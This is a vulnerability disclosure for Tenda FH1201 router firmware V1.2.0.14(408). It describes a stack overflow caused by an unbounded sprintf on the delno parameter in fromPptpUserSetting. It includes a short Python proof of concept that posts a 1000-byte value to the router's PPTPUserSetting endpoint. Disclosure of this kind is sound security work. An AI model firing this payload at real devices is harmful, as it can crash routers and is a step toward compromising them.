## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3322.html

## Affected version

FH1201 Firmware  V1.2.0.14(408)

## Vulnerability details

The Tenda FH1201 Firmware  V1.2.0.14(408) has a stack overflow vulnerability located in the `fromPptpUserSetting` function. This function accepts the `delno` parameter from a POST request. The statement `sprintf(v9, "vpn.ser.pptpuser%s", s);` leads to a buffer overflow. The user-supplied `delno` can exceed the capacity of the `v9` array, thus triggering this security vulnerability.

![image-20240731140428775](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731140428775.png)

![image-20240731140454360](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731140454360.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/PPTPUserSetting"
payload = b"a"*1000

data = {"delno": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240731133213595](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731133213595.png)